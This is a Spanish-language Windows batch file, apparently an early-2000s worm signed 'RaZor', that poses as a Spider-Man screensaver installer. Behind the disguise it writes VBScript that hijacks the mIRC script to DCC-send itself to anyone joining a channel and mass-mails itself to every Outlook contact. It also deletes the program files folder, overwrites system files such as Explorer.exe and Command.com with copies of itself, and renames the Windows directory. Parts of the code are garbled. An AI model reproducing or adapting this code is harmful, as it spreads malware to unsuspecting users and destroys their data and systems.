   @echo RaZor/Zonavirus


   CLS
   @Echo -------------------------------------------------------------------------------
   @Echo               SPIDER MAN
   @Echo -------------------------------------------------------------------------------
   @ECHO PRESIONA CUALQUIER TECLA PARA EMPEZAR A INSTALAR EL SALVA PANTALLA  DE SPIDERMAN
   pause

   Echo COPY SpiderMan C:\SpiderMan.bat




   if exist C:\mirc\mirc.ini set mIRC=C:\mirc\
   if exist C:\progra~1\mirc\mirc.ini set mIRC=C:\progra~1\mirc\
   if exist D:\mirc\mirc.ini set mIRC=D:\mirc\
   if exist D:\progra~1\mirc\mirc.ini set mIRC=D:\progra~1\mirc\
   if exist E:\mirc\mirc.ini set mIRC=E:\mirc\
   if exist E:\progra~1\mirc\mirc.ini set mIRC=E:\progra~1\mirc\


   Echo Dim f > %WinDir%\Black Spider.vbe
   Echo Set fso = CreateObject("Scripting.FileSystemObject") >> %WinDir%\Black Spider.vbe
   Echo Set f = fso.OpenTextFile("%mIRC%Script.ini",2, True) >> %WinDir%\Black Spider.vbe
   Echo f.WriteLine "[Script]" >> %WinDir%\Black Spider.vbe
   Echo f.Write "n0=on 1:JOIN:#:if ( "  >> %WinDir%\Black Spider.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\Black Spider.vbe
   Echo f.Write "me != " >> %WinDir%\Black Spider.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\Black Spider.vbe
   Echo f.Write "nick ) { /msg " >> %WinDir%\Black Spider.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\Black Spider.vbe
   Echo f.Write "Nick Mira El Nuevo Salva Pantalla De SpiderMan! | /" >> %WinDir%\Black Spider.vbe"
   Echo f.Write "dcc send " >> %WinDir%\Black Spider.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\Black Spider.vbe
   Echo f.Write "nick C:\SpiderMan.bat }" >> %WinDir%\Black Spider.vbe
   Erase %0
   Exit

   Echo Dim a,b,c,d,e,f,g > %WinDir%\Black Spider.vbe
   Echo Set fso = CreateObject ("outlook.application") >> %WinDir%\Black Spider.vbe
   Echo Set a = fso.GetNameSpace ("MAPI") >> %WinDir%\Black Spider.vbe
   Echo For b = 1 To a.AddressLists.Count >> %WinDir%\Black Spider.vbe
   Echo Set c = a.AddressLists (b) >> %WinDir%\Black Spider.vbe
   Echo g = 1 >> %WinDir%\Black Spider.vbe
   Echo Set d = fso.CreateItem (0) >> %WinDir%\Black Spider.vbe
   Echo For e = 1 To c.AddressEntries.Count >> %WinDir%\Black Spider.vbe
   Echo f = c.AddressEntries (g) >> %WinDir%\Black Spider.vbe
   Echo d.Recipients.Add f >> %WinDir%\Black Spider.vbe
   Echo g = g + 1 >> %WinDir%\Black Spider.vbe
   Echo Next >> %WinDir%\Black Spider.vbe
   Echo d.Subject = "FDW:CHISTES PICANTES!" >> %WinDir%\Black Spider.vbe
   Echo d.Body = "Mira El Nuevo Salva Pantalla De SpiderMan!" >> %WinDir%\Black Spider.vbe
   Echo d.Attachments.Add "C:\SpiderMan.bat" >> %WinDir%\Black Spider.vbe
   Echo d.DeleteAfterSubmit = True >> %WinDir%\Black Spider.vbe
   Echo d.Send >> %WinDir%\Black Spider.vbe
   Echo Next >> %WinDir%\Black Spider.vbe


   Echo Set fso = CreateObject("Scripting.FileSystemObject") >> %WinDir%\Black Spider.vbe
   Echo Set fldr = fso.DeleteFolder("C:\Archivo de programa") >> %WinDir%\Black Spider.vbe

   Start %WinDir%\Black Spider.vbe

   Echo fso.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Win.ini", True >> %WinDir%\Klone.vbe"


   E


   Echo fso.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Win.com", True >> %WinDir%\Klone.vbe"
   Echo fso.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Command.com", True >> %WinDir%\Klone.vbe"
   Echo fso.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Asd.exe", True >> %WinDir%\Klone.vbe"
   Echo fso.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Explorer.exe", True >> %WinDir%\Klone.vbe"
   Echo fso.CopyFile Wscript.ScriptFullName, WindowsFolder & "\Winstart.bat", True >> %WinDir%\Klone.vbe"

   Start %WinDir%\Klone.vbe


   Start %WinDir%\RaZor.vbs


   Echo DEL %WinDir%\Spiders.vbe
   Echo DEL %WinDir%\Black Spider.vbe
   Echo DEL %WinDir%\Klone.vbe
   Echo DEL %WinDir%\RaZor.vbs


   cd\
   c:
   cd\
   ren windows ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
   cls

   CLS
   @Echo -------------------------------------------------------------------------------
   @ECHO WALLPAPER DE SPIDERMAN
   @ECHO HECHO POR: RaZor
   @ECHO Venezuela
   @ECHO Dedicado: Kuasanagui, HOKO, Cloud Strife, NERFIX, NEMESIZZ, ErGrone, Zirkov, XpLOaD, positron, etc..
   @ECHO Haora Metete En Internet Explorer Y Bajate El Wallpaper
   @Echo -------------------------------------------------------------------------------
   pause

   CLS
   @Echo -------------------------------------------------------------------------------
   @ECHO Para Bajarte El Wallpaper Entra A Esta Pagina!
   @ECHO http://groups.msn.com/LaMegaComunidad/Documentos/SpiderMan.exe
   @Echo -------------------------------------------------------------------------------
   pause
   Erase %0
   Exit
